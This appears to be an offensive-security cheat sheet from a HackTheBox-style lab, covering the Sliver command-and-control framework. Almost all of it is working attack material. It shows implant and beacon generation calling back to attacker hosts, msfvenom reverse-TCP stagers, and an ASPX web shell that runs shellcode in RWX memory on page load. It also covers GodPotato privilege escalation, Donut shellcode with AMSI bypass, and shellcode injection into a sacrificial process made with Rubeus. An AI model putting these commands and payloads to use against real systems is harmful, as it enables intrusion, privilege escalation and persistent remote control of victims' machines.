...
```shell
# Quick Sliver implant generation
sliver-server && generate --mtls $lhost:443 --os windows --arch amd64 --save /tmp/implant.exe
```
...
Sliver Docs `http://sliver.sh/docs/?name=Stagers`

```Bash
# Profiles
sliver > profiles new --http 10.10.15.186:8088 --format shellcode HTB

# Listener
sliver > stage-listener --url tcp://10.10.15.186:4443 --profile HTB

# Stager for TCP
msfvenom --payload windows/x64/custom/reverse_tcp LHOST=10.10.15.186 LPORT=4443 --format raw --out /tmp/stager.bin


python3 -c "
data = open('stager.bin','rb').read()
arr = ','.join(f'0x{b:02x}' for b in data)
print(f'byte[] buf = new byte[{len(data)}] {{{arr}}};')
"
...
<script runat="server">
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        ...
        IntPtr mem = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(buf,0,mem,buf.Length);
        IntPtr tid = IntPtr.Zero;
        IntPtr hThread = CreateThread(IntPtr.Zero,UIntPtr.Zero,mem,IntPtr.Zero,0,ref tid);
    }
</script>
```
...
# Impersonate token
sliver > impersonate <username>
sliver > rev2self

# Privileges SeImpersonatePrivileges
sliver > execute-assembly --in-process /path/to/GodPotato-NET4.exe -- -cmd "cmd /c whoami"
```

### Donut Setup

```Bash
# Take advantages of donut
sliver > generate beacon --http $lhost:$lport --skip-symbols -N http-beacon
sliver > upload http-beacon.exe
sliver > http --lhost $lhost --lport $lport

# To generate the binary shellcode (Use godpotato to run http-beacon)
python3 -c "
import donut
shellcode = donut.create(
    file='/home/dolphin2546/Desktop/tools/GodPotato-NET4.exe',
    arch=2,
    bypass=2,
    params='-cmd c:\\\\temp\\\\http-beacon.exe'
)
open('godpotato.bin','wb').write(shellcode)
print(f'Done: {len(shellcode)} bytes')
"

# Use Rubeus.exe to create sacrify process
sliver > execute-assembly /path/to/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe

# Abuse Sacrify PID to run our 
sliver > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin

# Monitor state of process
sliver > ps -e notepad

# Print out the beacons
sliver > beacons
sliver > use <beacons id>
sliver > tasks # Monitor finish and pending task
```
